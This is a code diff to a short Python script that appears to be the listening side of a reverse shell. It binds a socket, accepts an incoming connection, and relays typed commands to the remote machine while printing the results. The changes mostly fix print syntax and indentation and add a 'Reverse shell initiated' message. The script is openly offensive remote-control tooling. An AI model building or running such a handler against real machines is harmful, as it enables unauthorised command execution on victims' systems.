@@ -16,13 +16,13 @@ def socketCreate():
             socketCreate()
         port = int(port)
     except socket.error as msg:
-        print 'oopsies'
+        print ('oopsies')
 
 def socketBind():
     try:
-        print 'Binding as %s' %(port)
-    s.bind((host,port))
-    s.listen(1)
+        print ('Binding as %s' %(port))
+        s.bind((host,port))
+        s.listen(1)
     except socket.error as msg:
         print ('r u dumb')
         #try to bind again
@@ -34,7 +34,7 @@ def socketAccept():
     global hostname
     try:
         conn , addr = s.accept()
-        print ('Seccsion open at %s %S' % (addr[0], addr[1]))
+        print ('[!] Session opened at %s:%s' %(addr[0],addr[1]))
         print ('\n')
         hostname = conn.recv(1024)
         menu()
@@ -42,6 +42,7 @@ def socketAccept():
         print (' this is unacceptable')
 
 def menu():
+    print('Reverse shell initiated')
     while 1:
         cmd = raw_input(str(addr[0])+'@' + str(hostname) + '> ')
         if cmd == 'quit':
@@ -51,10 +52,10 @@ def menu():
         command = conn.send(cmd)
         result = conn.recv(16834)
         if result <> hostname:
-            print result
+            print (result)
 
 
-def main()
+def main():
     socketCreate()
     socketBind()
     socketAccept()
